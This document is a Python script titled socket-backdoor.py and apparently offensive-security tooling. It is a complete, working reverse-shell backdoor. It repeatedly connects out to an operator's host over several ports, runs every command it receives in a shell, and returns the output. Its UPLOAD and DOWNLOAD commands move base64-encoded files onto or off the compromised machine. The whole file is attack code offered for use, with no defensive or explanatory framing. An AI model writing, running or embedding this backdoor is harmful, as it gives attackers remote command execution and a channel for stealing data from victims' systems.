"""usage: socket-backdoor.py [-h] [-l HOST] [-p PORTS] [-f FAMILY] [-t TYPE]
                          [--protocol PROTOCOL] [--fileno FILENO] [-w WAIT]

options:
  -h, --help            show this help message and exit
  -l HOST, --host HOST  The IP address to connect to
  -p PORTS, --ports PORTS
                        A comma separated list of ports to try to connect to
  -f FAMILY, --family FAMILY
                        The socket family to use
  -t TYPE, --type TYPE  The socket type to use
  --protocol PROTOCOL   The socket protocol to use
  --fileno FILENO       The file descriptor to use
  -w WAIT, --wait WAIT  The number of seconds to wait between connection attempts"""

import socket
import time
import subprocess
import codecs
import pathlib
import argparse

class SocketBackdoor(object):
    def __init__(self, host, ports, wait=1, **socket_kwargs):
        self.host = host
        self.ports = ports
        self.wait = wait
        self.mysocket = socket.socket(**socket_kwargs)

    def connect(self):
        connected = False
        while not connected:
            for port in self.ports:
                time.sleep(self.wait)
                try:
                    print("Trying", port, end=" ")
                    self.mysocket.connect((self.host, port))
                except socket.error:
                    print("Nope")
                    continue
                else:
                    print("Connected")
                    connected = True
                    break

    def upload(self):
        self.mysocket.send(b"What is the name of the file you are uploading?:")
        fname = self.mysocket.recv(1024).decode()
        self.mysocket.send(b"What unique string will end the transmission?:")
        endoffile = self.mysocket.recv(1024)
        self.mysocket.send(b"Transmit the file as a base64 encoded string followed by the end of transmission string.\n")
        data = b""
        while not data.endswith(endoffile):
            data += self.mysocket.recv(1024)
        try:
            file_bytes = codecs.decode(data[:-len(endoffile)], "base64")
            pathlib.Path(fname.strip()).write_bytes(file_bytes)
        except Exception as e:
            self.mysocket.send("An error occurred uploading file {0}. {1}".format(fname, str(e)).encode())
        else:
            self.mysocket.send(fname.strip().encode() + b" successfully uploaded")

    def download(self):
        self.mysocket.send(b"What is the name of the file you are downloading?:")
        fname = self.mysocket.recv(1024).decode().strip()
        self.mysocket.send(b"What unique string will end the transmission?:")
        endoffile = self.mysocket.recv(1024).strip()
        
        try:
            pathobj = pathlib.Path(fname)
            bs4_encoded_data = codecs.encode(pathobj.read_bytes(), 'base64')
            self.mysocket.sendall(bs4_encoded_data)
        except Exception as e:
            self.mysocket.sendall("An error occurred downloading the file {0}. {1}".format(fname, str(e)).encode())

        self.mysocket.sendall(endoffile)

    def handle_commands(self):
        self.connect()
        while True:
            try:
                commandrequested = self.mysocket.recv(1024).decode()
                if len(commandrequested) == 0:
                    time.sleep(self.wait)
                    self.mysocket = socket.socket()
                    self.connect()
                    continue
                if commandrequested[:4] == "QUIT":
                    self.mysocket.send(b"Terminating Connection.")
                    break
                if commandrequested[:6] == "UPLOAD":
                    self.upload()
                    continue
                if commandrequested[:8] == "DOWNLOAD":
                    self.download()
                    continue
                prochandle = subprocess.Popen(
                    commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results, errors = prochandle.communicate()
                results = results + errors
                self.mysocket.send(results)
            except socket.error:
                break
            except Exception as e:
                self.mysocket.send(str(e).encode())
                break

if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    
    parser.add_argument('-p', '--ports',
                        required=False,
                        type=lambda s: [int(p) for p in s.replace(',',' ').split()], 
                        default=[21, 22, 81, 443, 6969], 
                        help="A comma separated list of ports to try to connect to")  
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    parser.add_argument('-w', '--wait',
                        required=False,
                        default=1,
                        type=int,
                        help="The number of seconds to wait between connection attempts")
    
    
    args=parser.parse_args()

    # Initialize the socket and connect to the host and port
    handler = SocketBackdoor(host=args.host, ports=args.ports, wait=args.wait, family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    # Wait for a successful connection and handle commands
    handler.handle_commands()
